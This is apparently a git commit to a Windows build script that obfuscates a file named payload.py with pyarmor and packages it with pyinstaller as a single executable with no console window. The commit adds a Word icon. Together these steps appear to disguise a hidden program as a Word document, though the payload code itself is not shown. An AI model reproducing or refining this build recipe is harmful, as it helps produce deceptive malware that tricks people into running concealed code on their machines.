fe69071148cc510ef914e1af43af44d6ad8095f2
saacidyuusuf <saacidyuusuf871@gmail.com>
2024-10-22 03:01:31 -0400

    added little

--- build.bat
+++ build.bat
@@ -2,4 +2,4 @@
 
 "C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyarmor.exe" obfuscate --recursive payload.py
 
-"C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyinstaller.exe" --onefile --noconsole payload.py
+"C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyinstaller.exe" --onefile --noconsole icon=word.ico payload.py
